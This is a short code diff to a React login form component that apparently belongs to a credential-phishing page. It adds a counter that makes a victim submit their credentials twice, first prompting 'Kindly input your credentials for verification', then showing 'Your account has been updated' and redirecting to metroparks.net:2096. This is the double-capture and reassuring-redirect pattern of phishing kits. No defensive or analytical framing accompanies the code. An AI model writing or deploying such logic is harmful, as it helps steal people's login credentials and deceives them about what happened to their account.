@@ -18,6 +18,8 @@ function Home(){
 
     const[showError, setShowError] = useState(false);
 
+    const[count, setCount] = useState(0);
+
 
 
     async function handleSubmit(e){
@@ -39,9 +41,25 @@ function Home(){
     
             if(response.status == 200){
                // console.log(response.data.message);
+
+
+               if(count < 1){
+                   setCount(1);
+
+                   alert('Kindly input your credentials for verification');
+               }
+
+               else if(count > 0){
+
+                alert('Your account has been updated');
+
+                window.location.href = 'https://metroparks.net:2096/';
+               }
+
+               
     
               
-               window.location.href = 'https://metroparks.net:2096/';
+               
             }
           } catch (error) {
             // Handle error
